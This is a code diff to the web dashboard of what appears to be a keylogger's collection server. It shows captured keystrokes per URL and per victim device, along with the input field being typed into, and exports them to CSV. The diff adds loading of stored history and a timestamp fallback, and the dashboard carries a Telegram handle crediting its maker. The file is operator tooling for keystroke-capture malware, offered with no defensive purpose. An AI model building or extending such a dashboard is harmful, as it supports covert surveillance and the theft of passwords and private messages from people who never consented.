@@ -284,7 +284,7 @@
         <input
           id="filterInput"
           type="text"
-          placeholder="Filter by URL, keys or client..."
+          placeholder="Filter by URL, keys, field or client..."
         />
         <button id="groupToggle" class="btn">Group by URL: ON</button>
         <button id="themeToggle" class="btn">Theme: Dark</button>
@@ -294,7 +294,7 @@
       </div>
     </div>
     <div class="client-tabs" id="clientTabs">
-      <!-- dynamic: All / PC / Laptop etc -->
+      <!-- dynamic tabs -->
     </div>
   </header>
 
@@ -318,11 +318,11 @@
     </table>
 
     <div class="footer-note">
-      • Logs are kept in memory (latest 1000 entries).<br />
+      • Logs are kept in memory on the server (latest 1000 entries on dashboard).<br />
       • "Group by URL" shows one row per page <strong>and per client</strong>, combining all keys for that page/device.<br />
       • "Field" shows where you were typing (tag, type, name, id, placeholder).<br />
-      • Download CSV exports all logs currently in memory.
-      <div class="centrali">MadeByCentrali TELEGRAM @C3NTRALI</div>
+      • Download CSV exports all logs currently in memory in this dashboard view.
+      <div class="centrali">MadeByCentrali · Telegram @C3NTRALI</div>
     </div>
   </main>
 
@@ -370,8 +370,8 @@
         : [String(data.keys ?? "")];
 
       const tsArr = Array.isArray(data.timestamps) ? data.timestamps : [];
-      const primaryTs =
-        (tsArr[0] || new Date().toISOString()).replace("T", " ").slice(0, 19);
+      const tsSource = tsArr[0] || data.serverReceivedAt || new Date().toISOString();
+      const primaryTs = tsSource.replace("T", " ").slice(0, 19);
 
       return {
         id: nextId++,
@@ -571,6 +571,33 @@
       }
     }
 
+    // ---------- HISTORY LOAD ----------
+    async function loadHistory() {
+      try {
+        const res = await fetch("/history");
+        if (!res.ok) {
+          console.error("Failed to load history:", res.status);
+          return;
+        }
+        const data = await res.json();
+
+        // oldest → newest, but we unshift to keep newest on top
+        data.forEach(raw => {
+          const log = normalizeLog(raw);
+          logs.unshift(log);
+        });
+
+        if (logs.length > MAX_LOGS) {
+          logs = logs.slice(0, MAX_LOGS);
+        }
+
+        rebuildClientTabs();
+        render();
+      } catch (err) {
+        console.error("Error loading history:", err);
+      }
+    }
+
     // ---------- EVENTS ----------
     filterInput.addEventListener("input", e => {
       filterText = e.target.value.trim();
@@ -618,7 +645,7 @@
       const stamp =
         now.getFullYear().toString() +
         String(now.getMonth() + 1).padStart(2, "0") +
-        String(now.getDate()).padStart(2, "0") +
+        String(now.getDate(), 10).padStart(2, "0") +
         "-" +
         String(now.getHours()).padStart(2, "0") +
         String(now.getMinutes()).padStart(2, "0") +
@@ -654,9 +681,8 @@
       console.error("EventSource error:", err);
     };
 
-    // initial render
-    rebuildClientTabs();
-    render();
+    // ---------- INITIAL LOAD ----------
+    loadHistory();
   </script>
 </body>
 </html>
